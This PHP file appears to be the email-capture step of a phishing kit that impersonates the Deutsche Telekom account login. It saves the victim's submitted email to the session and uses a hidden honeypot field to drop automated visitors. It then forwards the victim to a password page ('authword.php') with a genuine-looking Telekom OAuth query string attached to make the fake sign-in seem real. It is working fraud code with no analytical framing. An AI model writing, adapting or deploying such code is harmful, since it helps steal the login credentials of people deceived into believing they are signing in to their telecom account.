<?php
error_reporting(0);
ob_start();
session_start();
$axp ="Re_Identify";





/** form fields **/

$_SESSION['email'] = $email = $_POST['pw_usr'];
$wiz = $_POST['wiz'];
$domain = @substr(strrchr($email, "@"), 1);
$downletter = strtolower("$domain");
if ($wiz !== '') {
	
	die();
	
}else {



// pass valid/invalid emails
if (filter_var($email, FILTER_VALIDATE_EMAIL)) 
{
 //Exiting to next page
$asp = "https://accounts.login.idm.telekom.com/oauth2/auth?scope=openid&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&response_type=code&redirect_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Fopenid_connect_login&state=36184e7e08e66&logout_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Flogout&nonce=563d9372867c&client_id=10LIVESAM30000004901AM200000000000000000";
$mover = "authword.php?$asp";
$Redirect = $mover;    
}
else 
{
     //Exiting to error page
$asp = "error=invalidemail&echo=$email&uri=https://accounts.login.idm.telekom.com/oauth2/auth?scope=openid&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&response_type=code&redirect_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Fopenid_connect_login&state=36184e7e08e66&logout_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Flogout&nonce=563d9372867c&client_id=10LIVESAM30000004901AM200000000000000000";
$mover = "./?$asp";
$Redirect = $mover;
}






header("Location: $Redirect");
}

	
	
?>